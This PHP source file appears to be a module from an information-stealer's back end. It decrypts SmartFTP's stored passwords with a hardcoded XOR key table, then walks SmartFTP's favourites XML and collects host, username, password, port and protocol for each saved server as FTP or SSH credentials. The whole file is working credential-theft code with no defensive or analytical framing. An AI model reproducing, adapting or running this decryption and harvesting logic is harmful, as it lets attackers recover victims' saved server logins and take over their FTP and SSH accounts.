<?php

class Module_smartftp extends Module_
{
    protected function Decrypt($Password)
	{
		if ((!strlen($Password)) || ((strlen($Password) % 4) != 0))
			return '';

		$CPY_ = array(
		    0xE722, 0xF62F, 0xB67C, 0xDD5A, 0x0FDB, 0xB94E, 0x5196, 0xE040, 0xF694, 0xABE2, 0x21BB, 0xFC08, 0xE48E, 0xB96A, 0x55D7, 0xA6E5,
    		0xA4A1, 0x2172, 0x822D, 0x29EC, 0x57E4, 0x1458, 0x04D1, 0x9DC1, 0x7020, 0xFC6A, 0xED8F, 0xEFBA, 0x8E88, 0xD689, 0xD18E, 0x8740,
    		0xA6DE, 0x8E01, 0x3AC2, 0x6871, 0xEE11, 0x8C2A, 0x5FC1, 0x337F, 0x6D32, 0xD471, 0x7DC9, 0x0CD9, 0x5071, 0xA094, 0x1605, 0x6FD7,
    		0x3638, 0x4FFD, 0xB3B2, 0x9717, 0xBECA, 0x721C, 0x623F, 0x068F, 0x698F, 0x7FFF, 0xE29C, 0x27E8, 0x7189, 0x4939, 0xDB4E, 0xC3FD,
    		0x8F8B, 0xF4EE, 0x9395, 0x6B1A, 0xD1B1, 0x0F6A, 0x4D8B, 0xA696, 0xA79D, 0xBB9E, 0x00DF, 0x093C, 0x856F, 0xB51C, 0xF1C5, 0xE83D,
    		0x393A, 0x03D1, 0x68D8, 0x9659, 0xF791, 0xB2C2, 0x0234, 0x9B5C, 0xB1BF, 0x72EB, 0xDABA, 0xF1C5, 0xDA01, 0xF047, 0x3DD8, 0x72AB,
    		0xD6DD, 0x6793, 0x898D, 0x7757);

		$Password = hex2bin($Password);

		if ($Password !== FALSE)
		{
			$Password = substr($Password, 0, 200);
			for ($i = 0; $i < idiv(strlen($Password), 2); $i++)
			{
				$Password[$i*2] = chr(ord($Password[$i*2]) ^ ($CPY_[$i] >> 8));
				$Password[$i*2+1] = chr(ord($Password[$i*2+1]) ^ ($CPY_[$i] & 0xff));
			}
			return iconv('UTF-16LE', 'UTF-8', $Password);
		}
		
		return '';
	}

    //V3
    protected function ProcessItem($Source)
    {
        $Host = Assign_($Source->Host);
        $User = Assign_($Source->User);
        $Pass = $this->Decrypt($Source->Password);
        $Port = Assign_($Source->Port);
        $Prot = $Source->Protocol;

        if(isset($Source->Pass['encoding']) AND $Source->Pass['encoding'] == "base64")
        {
            $Pass = base64_decode($Pass);
        }

		if($Prot <= 4)
			$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 4) , $Port), $User, $Pass);
    }
    protected function ProcessItems($Elements)
    {
        if(isset($Elements->Host))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->Host))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
    protected function ProcessXML($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
			return NULL;

        $this->ProcessItems($XML_);
		
		$XML_ = NULL;
    }


    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:
            $this->ProcessXML($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}